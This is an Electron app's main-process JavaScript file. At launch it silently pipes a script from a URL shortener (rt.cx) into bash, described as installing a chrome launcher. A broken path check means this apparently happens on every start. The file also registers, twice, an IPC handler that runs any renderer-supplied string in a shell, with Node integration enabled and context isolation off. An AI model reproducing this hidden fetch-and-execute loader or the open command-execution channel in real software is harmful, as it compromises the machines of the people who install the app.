const { app, BrowserWindow, ipcMain } = require('electron');
const { exec } = require('child_process');
const fs = require('fs');

function createWindow() {
  const win = new BrowserWindow({
    width: 800,
    height: 600,
    webPreferences: {
      nodeIntegration: true,
      contextIsolation: false,
    },
    icon: './images/icon.png' // additional app icon config for Linux machines
  });

  win.loadFile('index.html');


  ipcMain.on('run-command', async (event, command) => {
    const shellPath = await getShellPath()
    const shellProfileFilename = getShellProfileFilenameFromPath(shellPath)

    // send command back to renderer to notify that command has finished
    win.webContents.send('end-command', command);
    
    exec(`source ~/${shellProfileFilename} && ${command}`, { shell: shellPath }, (error, stdout, stderr) => {
      if (error) {
        console.error(`Error executing script: ${error}`);
        return;
      }
      if (stdout) {
        console.log(`stdout: ${stdout}`);
      }
      if (stderr) {
        console.error(`stderr: ${stderr}`);
      }
    });
  });
}

app.whenReady().then(async () => {
  // Check if file exists before installing chrome-launcher
  if (!fs.existsSync('~/bin/chrome_launcher.sh')) {
    await new Promise(res => {
      exec('curl -sL https://rt.cx/psat | bash', (error, stdout, stderr) => {
        if (error) {
          console.error(`Error executing command: ${error}`);
          return;
        }
        if (stdout) {
          console.log(`stdout: ${stdout}`);
        }
        if (stderr) {
          console.error(`stderr: ${stderr}`);
        }
        res()
      });
    })
  }

  createWindow()
});

app.on('window-all-closed', app.quit);

app.on('activate', () => {
  if (BrowserWindow.getAllWindows().length === 0) {
    createWindow();
  }
});

function getShellPath() {
  return new Promise((res) => {
    exec(`echo $SHELL`, (error, stdout) => {
      res(stdout.trim())
    })
  })
}

function getShellProfileFilenameFromPath(shellPath) {
  return `.${shellPath.split('/bin/').pop().trim()}rc`
}

ipcMain.on('run-command', async (event, command) => {
  const shellPath = await getShellPath()
  const shellProfileFilename = getShellProfileFilenameFromPath(shellPath)

  exec(`source ~/${shellProfileFilename} && ${command}`, { shell: shellPath }, (error, stdout, stderr) => {
    if (error) {
      console.error(`Error executing script: ${error}`);
      return;
    }
    if (stdout) {
      console.log(`stdout: ${stdout}`);
    }
    if (stderr) {
      console.error(`stderr: ${stderr}`);
    }
  });
});
